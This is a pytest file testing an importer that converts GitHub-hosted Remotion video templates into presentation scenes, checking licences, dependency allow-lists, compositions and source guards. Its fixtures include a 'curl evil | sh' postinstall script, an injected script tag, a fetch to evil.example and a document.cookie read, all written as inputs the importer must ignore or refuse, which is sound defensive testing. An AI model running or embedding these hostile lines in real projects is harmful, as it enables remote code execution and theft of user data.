"""Analyse d'un modèle Remotion amont : dépendances, composition, graphe d'imports, licence, catalogue v3 (Slice 18).

Pur, sans réseau : des archives `codeload` synthétiques (`tests/fakes/upstream_archive.py`). Contrat : `docs/remotion-import.md` §3-5.
"""

from __future__ import annotations

from datetime import datetime, timezone
import json

import pytest

from jarvis.domain.prefab import parse_candidate
from jarvis.domain.prefab_catalog import VERIFIED_UPSTREAM_KEYS
from jarvis.domain.remotion_compile import SCENE_ALLOWED_IMPORTS
from jarvis.domain.remotion_import import ImportErrorCode as E, analyse_archive, find_composition_tags, parse_import_request, strip_comments
from jarvis.domain.remotion_source import Composition
from jarvis.domain.remotion_upstream import REMOTION_RUNTIME_LICENCE, UpstreamRefusal
from tests.fakes.remotion_scene import ENGINE
from tests.fakes.upstream_archive import GPL, MIT, PNG, SHA, good_project, make_tarball

NOW = datetime(2026, 10, 10, 12, 0, 0, tzinfo=timezone.utc)
URL = "https://github.com/someone/demo"


def request(**fields):
    return parse_import_request({"repo_url": URL, "commit": SHA, **fields}, allowed_owners=("someone",), need_presentation=False)


def plan_of(files, *, comment=None, **fields):
    data = make_tarball(files, comment=comment)
    return analyse_archive(data, request(**fields), engine=ENGINE, imported_at=NOW)


def refused(files, code=None, **fields) -> UpstreamRefusal:
    with pytest.raises(UpstreamRefusal) as caught:
        plan_of(files, **fields)
    if code is not None:
        assert caught.value.code == code, caught.value.to_dict()
    return caught.value


def project(**changes):
    files = good_project()
    for key, value in changes.items():
        path = key.replace("__", "/").replace("_dot_", ".")
        if value is None:
            files.pop(path, None)
        else:
            files[path] = value
    return files


# ------------------------------------------------------------------ requête

def test_the_request_keys_are_closed_and_an_import_has_no_way_to_ask_for_the_global_library():
    for field in ("scope", "library", "publish", "global", "promote"):
        error = None
        with pytest.raises(UpstreamRefusal) as caught:
            parse_import_request({"repo_url": URL, "commit": SHA, field: True}, allowed_owners=("someone",), need_presentation=False)
        assert caught.value.code == E.REQUEST_INVALID and "scoped to a presentation" in caught.value.message


@pytest.mark.parametrize("fields", [{"composition_id": "bad id"}, {"subdir": "../x"}, {"subdir": "/abs"}, {"scene_id": "x"},
                                    {"composition": {"width": 1}}, {"composition": {"width": "1", "height": 1, "fps": 1, "duration_in_frames": 1}},
                                    {"title": "a\nb"}])
def test_malformed_optional_fields_are_refused(fields):
    with pytest.raises(UpstreamRefusal) as caught:
        request(**fields)
    assert caught.value.code in (E.REQUEST_INVALID, "origin_invalid")


def test_an_import_needs_a_presentation_but_a_plan_does_not():
    with pytest.raises(UpstreamRefusal) as caught:
        parse_import_request({"repo_url": URL, "commit": SHA}, allowed_owners=("someone",), need_presentation=True)
    assert caught.value.code == E.REQUEST_INVALID and "scoped to one presentation" in caught.value.message
    ok = parse_import_request({"repo_url": URL, "commit": SHA, "presentation_id": "pst_0123456789abcdef0123456789abcdef"}, allowed_owners=("someone",), need_presentation=True)
    assert ok.presentation_id == "pst_0123456789abcdef0123456789abcdef"


# ------------------------------------------------------------------ cas nominal

def test_a_template_becomes_a_scene_source_with_the_composition_read_from_the_root():
    plan = plan_of(good_project())
    assert plan.composition == Composition("DemoScene", 1280, 720, 30, 90)
    assert plan.modules == ("src/Demo.tsx", "src/Scene.tsx", "src/defaults.ts", "src/lib/Badge.tsx", "src/upstream/license.json")
    assert plan.assets == ("public/logo.png")  or plan.assets == ("public/logo.png",)
    # la scène n'atteint ni Root, ni index, ni le module inutilisé ; l'asset non nommé par staticFile reste dehors
    assert plan.dropped_modules == 3 and plan.dropped_assets == 1
    entry = plan.candidate["sources"]["src/Scene.tsx"]
    assert 'import {Demo} from "./Demo";' in entry and 'import {defaults} from "./defaults";' in entry
    assert 'const defaultProps = {title: "Hello", palette: defaults};' in entry
    assert "createElement(Demo as any, {...defaultProps, ...props})" in entry and "export default function ImportedScene" in entry
    assert "Ghost" not in json.dumps(plan.candidate)  # un <Composition> en commentaire n'existe pas


def test_the_candidate_is_a_valid_v3_manifest_with_the_two_licences_recorded_apart():
    plan = plan_of(good_project())
    manifest = plan.candidate["manifest"]
    assert manifest["schema_version"] == 3 and manifest["source"]["entry"] == "src/Scene.tsx"
    catalog = manifest["catalog"]
    assert catalog["license"] == "MIT" and catalog["runtime_license"] == REMOTION_RUNTIME_LICENCE
    assert catalog["type"] == "composition" and catalog["compatibility"] == {"remotion": "native", "slidecar": "unsupported"}
    assert catalog["dependencies"] == [{"name": "react", "version": ENGINE.react_version}, {"name": "remotion", "version": ENGINE.version}]
    upstream = catalog["upstream"]
    assert upstream["name"] == "someone/demo" and upstream["url"] == URL and upstream["commit"] == SHA
    assert upstream["license"] == "MIT" and upstream["imported_at"] == "2026-10-10T12:00:00Z" and len(upstream["archive_sha256"]) == 64
    assert upstream["changes"] and set(VERIFIED_UPSTREAM_KEYS) <= set(upstream)
    bundle = parse_candidate(plan.candidate)  # manifeste, fichiers et gardes de la Slice 06
    assert bundle.manifest.catalog.upstream.verified and bundle.manifest.catalog.runtime_license == REMOTION_RUNTIME_LICENCE


def test_the_licence_text_travels_with_the_source_and_no_package_json_is_copied():
    plan = plan_of(good_project())
    kept = json.loads(plan.candidate["sources"]["src/upstream/license.json"])
    assert kept["spdx_id"] == "MIT" and "Permission is hereby granted" in kept["text"] and kept["upstream"] == f"someone/demo@{SHA}"
    names = set(plan.candidate["sources"]) | set(plan.candidate["assets"])
    assert not any("package" in name or "node_modules" in name or name.endswith(".lock") for name in names)


def test_the_dependency_map_follows_the_shared_tree_and_dropped_ones_are_listed_not_shipped():
    plan = plan_of(good_project())
    assert plan.dependencies == (("react", ENGINE.react_version), ("remotion", ENGINE.version))
    assert plan.dropped_dependencies == ("@remotion/cli", "react-dom", "zod")
    assert any(line.startswith("remotion: 4.0.499 declared -> ") for line in plan.changes)
    assert any("never copied or run" in line for line in plan.changes) and len(plan.changes) <= 16
    public = plan.to_public()
    assert public["scope"] == "presentation" and public["license"]["runtime_license"] == REMOTION_RUNTIME_LICENCE
    assert "sources" not in json.dumps(public) and "candidate" not in public


def test_the_import_is_deterministic_for_one_archive():
    assert plan_of(good_project()).source_digest == plan_of(good_project()).source_digest
    assert plan_of(good_project()).candidate == plan_of(good_project()).candidate


# ------------------------------------------------------------------ dépendances

@pytest.mark.parametrize("module, spec", [("three", "three"), ("zod", "zod"), ("shapes", "@remotion/shapes"), ("dom", "react-dom/client"),
                                          ("fs", "fs"), ("node", "node:fs"), ("lodash", "lodash/get")])
def test_an_imported_package_outside_the_audited_list_is_a_typed_refusal_naming_it(module, spec):
    files = project(src__lib__Badge_dot_tsx=f"import x from '{spec}';\nexport const Badge = () => null;\n")
    error = refused(files, E.DEPENDENCY_REFUSED)
    assert spec in " ".join(error.details) and "src/lib/Badge.tsx" in " ".join(error.details)
    assert list(SCENE_ALLOWED_IMPORTS) == ["react", "react/jsx-runtime", "react/jsx-dev-runtime", "remotion"]


def test_a_dependency_reached_only_from_dropped_files_does_not_block_the_import():
    # zod est déclaré et importé par Root.tsx et unused.ts : aucun des deux n'est atteignable depuis le composant
    assert "zod" in plan_of(good_project()).dropped_dependencies


def test_require_dynamic_import_and_reexport_of_a_refused_package_are_all_seen():
    for body in ("const x = require('three');", "const m = import('three');", "export * from 'three';", "import 'three';",
                 "export {a} from 'three';", "import {a,\n b} from \"three\";"):
        refused(project(src__lib__Badge_dot_tsx=body + "\nexport const Badge = () => null;\n"), E.DEPENDENCY_REFUSED)


def test_type_only_imports_and_imports_in_comments_or_strings_are_not_dependencies():
    body = ("import type {A} from 'three';\n// import x from 'lodash'\n/* import y from 'three' */\n"
            "export const s = \"import z from 'three'\";\nexport const Badge = () => null;\n")
    assert "src/lib/Badge.tsx" in plan_of(project(src__lib__Badge_dot_tsx=body)).modules


def test_another_remotion_major_is_refused_and_another_react_major_is_a_warning():
    pkg = json.dumps({"license": "MIT", "dependencies": {"remotion": "^3.3.0", "react": "^18.2.0"}})
    assert refused(project(package_dot_json=pkg), E.REMOTION_VERSION)
    ok = json.dumps({"license": "MIT", "dependencies": {"remotion": "^4.0.0", "react": "^18.2.0"}})
    plan = plan_of(project(package_dot_json=ok))
    assert any("react ^18.2.0" in warning and ENGINE.react_version in warning for warning in plan.warnings)


def test_install_scripts_are_never_run_and_do_not_matter():
    pkg = json.dumps({"license": "MIT", "scripts": {"postinstall": "curl evil | sh"}, "dependencies": {"remotion": "4.0.499"}})
    plan = plan_of(project(package_dot_json=pkg))
    assert "postinstall" not in json.dumps(plan.candidate)


# ------------------------------------------------------------------ licence

def test_the_licence_of_the_template_decides_and_a_restricted_one_blocks_the_import():
    refused(project(LICENSE=GPL), E.LICENSE_RESTRICTED)
    refused(project(LICENSE=None, package_dot_json=json.dumps({"license": "UNLICENSED"})), E.LICENSE_UNLICENSED)
    refused(project(LICENSE=None, package_dot_json="{}"), E.LICENSE_MISSING)
    refused(project(LICENSE="made up terms"), E.LICENSE_UNKNOWN)
    refused(project(package_dot_json=json.dumps({"license": "Apache-2.0"})), E.LICENSE_CONFLICT)
    declared = plan_of(project(LICENSE=None, package_dot_json=json.dumps({"license": "ISC", "dependencies": {}})))
    assert declared.licence == {"spdx": "ISC", "source": "package.json"}


def test_a_licence_file_in_a_monorepo_subdir_wins_over_the_repository_root():
    files = {f"packages/app/{path}": body for path, body in good_project().items() if path not in ("LICENSE",)}
    files["LICENSE"] = GPL
    files["packages/app/LICENSE"] = MIT
    plan = plan_of(files, subdir="packages/app")
    assert plan.licence["spdx"] == "MIT" and "src/Scene.tsx" in plan.modules


# ------------------------------------------------------------------ composition et entrée

def test_a_project_with_several_compositions_needs_the_id_and_a_missing_one_is_listed():
    two = ROOT_TWO
    error = refused(project(src__Root_dot_tsx=two), E.COMPOSITION_AMBIGUOUS)
    assert error.details == ("DemoScene", "Other")
    assert plan_of(project(src__Root_dot_tsx=two), composition_id="Other").composition.composition_id == "Other"
    assert refused(project(src__Root_dot_tsx=two), E.NO_COMPOSITION, composition_id="Missing").details == ("DemoScene", "Other")
    refused(project(src__Root_dot_tsx="export const Root = () => null;\n"), E.NO_COMPOSITION)


ROOT_TWO = """import {Composition} from 'remotion';
import {Demo} from './Demo';
export const FPS = 24;
export const SECONDS = 4;
export const Root = () => (<>
  <Composition id="DemoScene" component={Demo} durationInFrames={90} fps={30} width={1280} height={720} />
  <Composition id="Other" component={Demo} durationInFrames={SECONDS * FPS} fps={FPS} width={800} height={600} />
</>);
"""


def test_numeric_constants_and_simple_arithmetic_are_resolved_but_nothing_is_guessed():
    plan = plan_of(project(src__Root_dot_tsx=ROOT_TWO), composition_id="Other")
    assert plan.composition == Composition("Other", 800, 600, 24, 96)
    unresolved = ROOT_TWO.replace("export const FPS = 24;", "export const FPS = Number(process.env.FPS);")
    error = refused(project(src__Root_dot_tsx=unresolved), E.COMPOSITION_UNRESOLVED, composition_id="Other")
    assert "fps" in error.message and "composition" in error.message
    plan = plan_of(project(src__Root_dot_tsx=unresolved), composition_id="Other",
                   composition={"width": 800, "height": 600, "fps": 25, "duration_in_frames": 100})
    assert plan.composition == Composition("Other", 800, 600, 25, 100)


def test_a_component_that_is_not_a_project_export_or_default_props_that_use_a_local_constant_are_refused():
    root = ROOT_TWO.replace("import {Demo} from './Demo';", "import {Demo} from 'some-package';")
    refused(project(src__Root_dot_tsx=root), E.COMPONENT_UNRESOLVED, composition_id="Other")
    root = ROOT_TWO.replace("import {Demo} from './Demo';\n", "const Demo = () => null;\n")
    refused(project(src__Root_dot_tsx=root), E.COMPONENT_UNRESOLVED, composition_id="Other")
    local = ROOT_TWO.replace("export const FPS", "const palette = {a: 1};\nexport const FPS").replace('height={600} />', 'height={600} defaultProps={{p: palette}} />')
    refused(project(src__Root_dot_tsx=local), E.DEFAULT_PROPS_UNRESOLVED, composition_id="Other")


def test_a_component_defined_in_the_registering_file_is_imported_from_it_and_a_default_export_works():
    root = "import {Composition} from 'remotion';\nexport const Local = () => null;\nexport const Root = () => <Composition id=\"L\" component={Local} durationInFrames={10} fps={30} width={100} height={100} />;\n"
    plan = plan_of(project(src__Root_dot_tsx=root))
    assert 'import {Local} from "./Root";' in plan.candidate["sources"]["src/Scene.tsx"]
    default_root = ("import {Composition} from 'remotion';\nimport Demo from './DemoDefault';\nexport const Root = () => "
                    "<Composition id=\"D\" component={Demo} durationInFrames={10} fps={30} width={100} height={100} />;\n")
    files = project(src__Root_dot_tsx=default_root, src__DemoDefault_dot_tsx="export default function Demo() { return null; }\n")
    assert 'import Demo from "./DemoDefault";' in plan_of(files).candidate["sources"]["src/Scene.tsx"]


def test_an_upstream_scene_file_does_not_collide_with_the_generated_entry():
    files = project(src__Scene_dot_tsx="export const Scene = () => null;\n")
    plan = plan_of(files)
    assert plan.candidate["manifest"]["source"]["entry"] == "src/JarvisEntry.tsx"


def test_a_monorepo_subdir_is_the_project_root():
    files = {f"packages/app/{path}": body for path, body in good_project().items() if path != "LICENSE"}
    files["LICENSE"] = MIT
    plan = plan_of(files, subdir="packages/app")
    assert plan.modules[0] == "src/Demo.tsx" and plan.assets == ("public/logo.png",)
    refused(files, E.NO_PROJECT, subdir="packages/missing")


# ------------------------------------------------------------------ graphe d'imports et assets

def test_style_and_media_imports_unresolved_and_escaping_imports_are_typed_refusals():
    refused(project(src__lib__Badge_dot_tsx="import './x.css';\nexport const Badge = () => null;\n", src__lib__x_dot_css="a{}"), E.IMPORT_UNSUPPORTED)
    refused(project(src__lib__Badge_dot_tsx="import x from './nope';\nexport const Badge = () => null;\n"), E.IMPORT_UNRESOLVED)
    refused(project(src__lib__Badge_dot_tsx="import x from '../../outside';\nexport const Badge = () => null;\n"), E.IMPORT_OUTSIDE)


def test_assets_are_kept_only_when_a_literal_static_file_names_them():
    plan = plan_of(good_project())
    assert plan.assets == ("public/logo.png",) and plan.candidate["assets"].keys() == {"public/logo.png"}
    dynamic = project(src__lib__Badge_dot_tsx="import {staticFile} from 'remotion';\nexport const Badge = ({n}: {n: string}) => staticFile(n) + staticFile('missing.png');\n")
    plan = plan_of(dynamic)
    assert any("computed name" in warning for warning in plan.warnings) and any("missing.png" in warning for warning in plan.warnings)


def test_the_slice_6_guards_run_on_the_imported_source_and_refuse_with_the_guard_findings():
    forbidden_asset = refused(project(public__logo_dot_png=b"<html><script>alert(1)</script></html>"), E.SOURCE_GUARD)
    assert forbidden_asset.details and all(item.startswith("guard:") for item in forbidden_asset.details)
    network = refused(project(src__lib__Badge_dot_tsx="export const Badge = () => { fetch('https://evil.example'); return null; };"), E.SOURCE_GUARD)
    assert "network_api" in " ".join(network.details) and "src/lib/Badge.tsx" in " ".join(network.details)
    storage = refused(project(src__lib__Badge_dot_tsx="export const Badge = () => { document.cookie; return null; };"), E.SOURCE_GUARD)
    assert storage.details


def test_too_many_modules_or_unreadable_text_are_refused_as_an_invalid_source():
    files = project(**{f"src__gen__m{i}_dot_ts": "export const a = 1;\n" for i in range(70)})
    imports = "".join(f"import '../gen/m{i}';\n" for i in range(70))
    files["src/lib/Badge.tsx"] = imports + "export const Badge = () => null;\n"
    assert refused(files, E.SOURCE_INVALID)
    bad = project()
    bad["src/lib/Badge.tsx"] = b"\xff\xfe\x00bad"
    assert refused(bad, E.SOURCE_INVALID)


def test_a_non_project_is_reported_as_such():
    refused({"LICENSE": MIT, "README.md": "x"}, E.NO_PROJECT)


# ------------------------------------------------------------------ outils de texte

def test_comment_stripping_respects_strings():
    text = "const a = 'http://x'; // gone\nconst b = \"/* keep */\"; /* gone\ntoo */ const c = `//keep`;"
    out = strip_comments(text)
    assert "http://x" in out and "/* keep */" in out and "//keep" in out and "gone" not in out and out.count("\n") == text.count("\n")


def test_composition_tags_are_found_with_nested_braces_and_strings_with_gt_signs():
    texts = {"src/Root.tsx": '<Composition id="A" component={A} defaultProps={{a: {b: "}>"}}} durationInFrames={3} fps={30} width={1} height={1} />'}
    (tag,) = find_composition_tags(texts)
    assert tag.id == "A" and tag.attrs["durationInFrames"] == ("expr", "3") and tag.attrs["defaultProps"][1].startswith("{a: {b:")
